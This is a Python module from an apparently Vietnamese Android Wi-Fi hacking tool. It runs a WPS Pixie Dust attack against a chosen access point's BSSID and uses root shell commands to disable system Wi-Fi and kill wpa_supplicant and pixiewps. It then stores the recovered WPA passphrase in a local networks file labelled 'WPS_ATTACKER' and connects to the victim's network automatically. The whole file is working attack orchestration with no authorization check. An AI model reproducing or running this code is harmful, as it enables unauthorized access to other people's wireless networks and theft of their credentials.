# tinhnang/modules/wps_module.py
import os
import time

from .base_module import BaseModule
from ..core.config import get_config
from ..core.file_manager import FileManager


def tan_cong_wps_with_cleanup(bssid, interface=None, use_pixie=True, save_result=True):
    from pws import tan_cong_wps
    if interface is None:
        interface = get_config().interface

    print(f"[*] Chuẩn bị mục tiêu: {bssid}  (iface={interface})")
    os.system("su -c 'svc wifi disable'")
    time.sleep(2)
    os.system(f"su -c 'ip link set {interface} up'")
    result = None
    try:
        result = tan_cong_wps(mac=bssid, interface=interface, use_pixie=use_pixie, save_result=save_result)
        if result and result.get("success"):
            print(f"[+] Thành công!")
        else:
            err = result.get("error", "Unknown") if result else "No result"
            print(f"[-] Thất bại: {err}")
    except Exception as e:
        print(f"[!] Lỗi phát sinh: {e}")
        result = {"success": False, "error": str(e)}
    finally:
        print("\n[*] Dọn dẹp...")
        os.system("su -c 'pkill wpa_supplicant'")
        os.system("su -c 'pkill pixiewps'")
        os.system("su -c 'rm -rf /data/local/tmp/wpa_ctrl_*'")
        os.system("su -c 'rm -rf /tmp/wpa_ctrl_*'")
        os.system("su -c 'svc wifi enable'")
        time.sleep(3)
        print("[+] Đã khôi phục Wifi hệ thống!")
    return result


class WpsModule(BaseModule):
    name = "wps"
    commands = ["wps_attack"]
    description = "Tấn công WPS (Pixie Dust)"

    version = "1.1.1"
    latest_version = "1.1.1"
    version_notes = "Trả partial khi cancel, log rõ từng bước."

    def init(self):
        iface = get_config().interface
        self.context.logger.write(f"[✓] WPS Module v{self.version} đã sẵn sàng! (iface={iface})")

    def handle(self, command, params):
        if command != "wps_attack":
            return {"status": "error", "message": f"Unknown: {command}", "type": "generic"}

        ctx = self.context
        ctx.wps_attacking = True
        network = params.get("network") or {}
        target_ssid = network.get("ssid", "?")
        target_bssid = network.get("bssid", "?")

        try:
            self.check_cancel()

            if not network:
                return {"status": "error", "message": "Thiếu thông tin mạng", "type": "generic"}

            target_wps = network.get("wps_enabled", False)
            security = network.get("security", "wpa2")

            if not target_wps:
                ctx.logger.write(f"[WPS] ⚠ WPS TẮT trên {target_ssid}")
                return {"status": "error", "type": "generic",
                        "message": "WPS không khả dụng trên mạng này"}

            ctx.logger.write(f"[WPS] 🎯 Bắt đầu: {target_ssid} ({target_bssid})")
            self.emit_progress(5, "Chuẩn bị tấn công WPS")

            self.check_cancel()
            self.emit_progress(20, "Chạy Pixie Dust...")
            ctx.logger.write("[WPS] Bước 1/2: Đang chạy Pixie Dust attack...")

            result = tan_cong_wps_with_cleanup(target_bssid, None, True, True)

            if self.is_cancelled():
                ctx.logger.write("[WPS] ⏹️ Đã dừng tấn công theo yêu cầu")
                self.emit_progress(None)
                return {
                    "status": "error", "type": "cancelled",
                    "network": network,
                    "message": f"Đã dừng tấn công WPS trên {target_ssid}",
                }

            self.emit_progress(90, "Xử lý kết quả")
            ctx.logger.write("[WPS] Bước 2/2: Phân tích kết quả...")

            if result and result.get("success"):
                wpa_psk = result.get("wpa_psk")
                if wpa_psk:
                    ctx.logger.write("[WPS] ✓ Tìm thấy PSK, đang lưu DB...")
                    self._luu_wifi(target_ssid, target_bssid, wpa_psk, security)

                    ctx.logger.write(f"[WPS] Đang kết nối tới {target_ssid}...")
                    ctx.wps_attacking = False
                    ctx.connecting = True
                    try:
                        success = ctx.wifi_manager and ctx.wifi_manager.connect(target_ssid, wpa_psk, security)
                        if success:
                            ctx.logger.write("[WPS] ✓ Kết nối thành công!")
                            self.emit_progress(100, "Hoàn tất")
                            return {"status": "success", "type": "wps_result",
                                    "message": "WPS thành công và đã kết nối!",
                                    "connected": True, "wpa_psk": wpa_psk}
                    finally:
                        ctx.connecting = False

                self.emit_progress(100, "Hoàn tất")
                return {"status": "success", "type": "wps_result",
                        "message": "WPS thành công (chưa kết nối được)"}

            err = result.get("error", "Lỗi không xác định") if result else "Không có kết quả"
            self.emit_progress(None)
            ctx.logger.write(f"[WPS] ✗ Thất bại: {err}")
            return {"status": "error", "type": "wps_result", "message": f"WPS thất bại: {err}"}

        except InterruptedError:
            ctx.logger.write("[WPS] ⏹️ Đã dừng theo yêu cầu")
            self.emit_progress(None)
            return {"status": "error", "type": "cancelled", "network": network,
                    "message": f"Đã dừng tấn công WPS trên {target_ssid}"}
        finally:
            ctx.wps_attacking = False

    def _luu_wifi(self, ssid, bssid, password, security):
        try:
            ctx = self.context
            kho_bau = ctx.file_manager.read_file("networks.acdv")
            current_data = {}
            if kho_bau.get("status") == "ACDV-Files" and kho_bau.get("data"):
                current_data = kho_bau["data"]
            exists = False
            for key, value in current_data.items():
                if len(value) >= 2 and value[0].upper() == bssid.upper():
                    current_data[key] = [bssid, ssid, password, security]
                    exists = True
                    break
            if not exists:
                new_key = str(len(current_data))
                current_data[new_key] = [bssid, ssid, password, security]
            return ctx.file_manager.save_file("networks.acdv", current_data, data_type="OBJ", who_am_i="WPS_ATTACKER")
        except Exception as e:
            self.context.logger.write(f"[!] Lỗi lưu WiFi: {e}")
            return False